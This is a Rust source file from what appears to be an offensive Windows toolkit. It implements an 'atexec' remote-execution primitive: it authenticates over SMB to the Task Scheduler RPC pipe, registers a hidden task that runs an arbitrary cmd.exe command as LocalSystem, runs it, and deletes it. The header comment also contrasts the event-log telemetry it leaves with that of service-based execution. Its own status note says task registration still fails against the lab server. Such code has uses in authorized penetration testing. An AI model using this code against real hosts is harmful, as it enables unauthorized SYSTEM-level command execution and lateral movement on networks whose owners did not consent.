//! TSCH (MS-TSCH) — the Task Scheduler Remote protocol, the `atexec` primitive. Register a
//! task whose action runs a command as LocalSystem, run it on demand, then delete it. Rides the
//! authenticated `\PIPE\atsvc` SMB transport like SAMR/SVCCTL. An alternative to the SVCCTL exec
//! (different telemetry — 4698 task-created vs 4697 service-installed).
//!
//! STATUS: `encode_register` is verified byte-for-byte against the MS-TSCH
//! `SchRpcRegisterTask` NDR IDL (only NDR pad-filler bytes differ, which the server ignores),
//! and the sealed bind is accepted. `SchRpcRegisterTask` still returns `nca_s_fault_ndr` (0x6f7)
//! against the Server 2025 lab over the sealed pipe — an unresolved transport subtlety that would
//! need a wire capture of a working atexec to pin. RCE is already covered by `attack exec`
//! (SVCCTL), so this is a redundant *method*, not a missing capability.

use crate::ndr::NdrEncoder;
use crate::transport::SmbPipe;
use crate::{Result, RpcError, Syntax};
use smb2_client::SmbClient;
use std::sync::atomic::{AtomicU64, Ordering};

/// The ITaskSchedulerService interface (v1.0).
pub fn tsch_syntax() -> Syntax {
    Syntax::new("86d35949-83c9-4044-b424-db363231fd0c", 1, 0)
}

pub mod opnum {
    pub const REGISTER_TASK: u16 = 1;
    pub const RUN: u16 = 12;
    pub const DELETE: u16 = 13;
}

const TASK_CREATE: u32 = 0x0000_0002;
const TASK_LOGON_NONE: u32 = 0;

/// XML-escape a string for embedding in the task definition (`&`, `<`, `>`).
fn xml_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
}

/// A Task Scheduler 1.2 definition: run `cmd.exe /Q /c <command>` as LocalSystem, hidden,
/// on-demand. `command` is embedded XML-escaped in the Exec Arguments.
fn task_xml(command: &str) -> String {
    format!(
        "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\
<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\
<Principals><Principal id=\"LocalSystem\"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>\
<Settings>\
<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\
<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\
<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\
<AllowHardTerminate>true</AllowHardTerminate>\
<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\
<IdleSettings><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings>\
<AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden>\
<ExecutionTimeLimit>PT10M</ExecutionTimeLimit><Priority>7</Priority>\
</Settings>\
<Actions Context=\"LocalSystem\"><Exec><Command>cmd.exe</Command><Arguments>/Q /c {}</Arguments></Exec></Actions>\
</Task>",
        xml_escape(command)
    )
}

/// SchRpcRegisterTask(path[unique], xml[unique], flags, sddl=NULL, logonType, cCreds=0,
/// pCreds=NULL). LPWSTR params marshal as referent-id (fixed part) + deferred WSTR pointee.
fn encode_register(path: &str, xml: &str) -> Vec<u8> {
    let mut e = NdrEncoder::new();
    // path is LPWSTR (unique pointer → referent + WSTR); xml is a mandatory WSTR (embedded,
    // no referent), per the MS-TSCH IDL.
    e.referent();
    e.conformant_varying_wstr(path);
    e.align(4);
    e.conformant_varying_wstr(xml);
    e.align(4);
    e.u32(TASK_CREATE); // flags
    e.null_ptr(); // sddl
    e.u32(TASK_LOGON_NONE); // logonType
    e.u32(0); // cCreds
    e.null_ptr(); // pCreds
    e.into_bytes()
}

/// SchRpcRun(path[unique], cArgs=0, pArgs=NULL, flags=0, sessionId=0, user=NULL).
fn encode_run(path: &str) -> Vec<u8> {
    let mut e = NdrEncoder::new();
    e.referent();
    e.conformant_varying_wstr(path);
    e.align(4);
    e.u32(0); // cArgs
    e.null_ptr(); // pArgs
    e.u32(0); // flags
    e.u32(0); // sessionId
    e.null_ptr(); // user
    e.into_bytes()
}

/// SchRpcDelete(path[unique], flags=0).
fn encode_delete(path: &str) -> Vec<u8> {
    let mut e = NdrEncoder::new();
    e.referent();
    e.conformant_varying_wstr(path);
    e.align(4);
    e.u32(0); // flags
    e.into_bytes()
}

/// Trailing HRESULT of a TSCH call (last 4 bytes of the response stub).
fn hresult(stub: &[u8], operation: &str) -> Result<u32> {
    crate::required_tail_u32(stub, operation)
}

static TASK_TAG_COUNTER: AtomicU64 = AtomicU64::new(0);

fn unique_tag() -> u64 {
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0);
    nanos
        ^ (std::process::id() as u64).rotate_left(17)
        ^ TASK_TAG_COUNTER.fetch_add(1, Ordering::Relaxed)
}

/// atexec: register a LocalSystem task running `command`, run it on demand, delete it. `path`
/// is the task path (e.g. `\ADh<tag>`). Returns the HRESULTs; the caller reads any output file
/// separately over `C$`. Once registration succeeds, deletion is attempted on every exit path;
/// cleanup failures are surfaced instead of being silently reported as success.
pub async fn atexec(
    client: &mut SmbClient,
    command: &str,
    domain: &str,
    user: &str,
    password: &str,
    host: &str,
) -> Result<(String, u32)> {
    let tag = unique_tag();
    let path = format!("\\ADh{tag:016x}");
    let xml = task_xml(command);

    let file_id = client
        .open_pipe("atsvc")
        .await
        .map_err(|e| RpcError::Protocol(format!("open \\atsvc: {e}")))?;
    let mut pipe = SmbPipe::new(client, file_id);
    // Task Scheduler enforces RPC packet privacy on SchRpcRegisterTask → sealed bind.
    pipe.bind_sealed(tsch_syntax(), domain, user, password, host)
        .await?;

    let reg = pipe
        .call_sealed(opnum::REGISTER_TASK, &encode_register(&path, &xml))
        .await?;
    let reg_hr = hresult(&reg, "SchRpcRegisterTask")?;
    if reg_hr != 0 {
        return Err(RpcError::Protocol(format!(
            "SchRpcRegisterTask failed (HRESULT 0x{reg_hr:08x})"
        )));
    }
    let run_result = pipe.call_sealed(opnum::RUN, &encode_run(&path)).await;
    let delete_result = pipe.call_sealed(opnum::DELETE, &encode_delete(&path)).await;

    let run = match run_result {
        Ok(run) => run,
        Err(run_error) => {
            match delete_result {
                Ok(delete) => match hresult(&delete, "SchRpcDelete") {
                    Ok(0) => {}
                    Ok(delete_hr) => {
                        return Err(RpcError::Protocol(format!(
                            "SchRpcRun failed ({run_error}); cleanup SchRpcDelete also failed (HRESULT 0x{delete_hr:08x})"
                        )));
                    }
                    Err(delete_error) => {
                        return Err(RpcError::Protocol(format!(
                            "SchRpcRun failed ({run_error}); cleanup reply was invalid ({delete_error})"
                        )));
                    }
                },
                Err(delete_error) => {
                    return Err(RpcError::Protocol(format!(
                        "SchRpcRun failed ({run_error}); cleanup SchRpcDelete also failed ({delete_error})"
                    )));
                }
            }
            return Err(run_error);
        }
    };
    let delete = delete_result?;
    let delete_hr = hresult(&delete, "SchRpcDelete")?;
    if delete_hr != 0 {
        return Err(RpcError::Protocol(format!(
            "SchRpcDelete failed (HRESULT 0x{delete_hr:08x})"
        )));
    }
    let run_hr = hresult(&run, "SchRpcRun")?;

    Ok((path, run_hr))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn xml_escapes_redirect() {
        let x = task_xml("whoami > C:\\out 2>&1");
        assert!(x.contains("/Q /c whoami &gt; C:\\out 2&gt;&amp;1"));
        assert!(x.contains("<UserId>S-1-5-18</UserId>"));
    }

    #[test]
    fn register_stub_inline_path_then_referent() {
        let s = encode_register("\\ADh1", "<Task/>");
        // path referent (non-null) then its inline WSTR max_count = len("\\ADh1")+1 = 6.
        assert_ne!(
            u32::from_le_bytes(s[0..4].try_into().unwrap()),
            0,
            "path referent"
        );
        assert_eq!(
            u32::from_le_bytes(s[4..8].try_into().unwrap()),
            6,
            "path WSTR max_count"
        );
    }
}
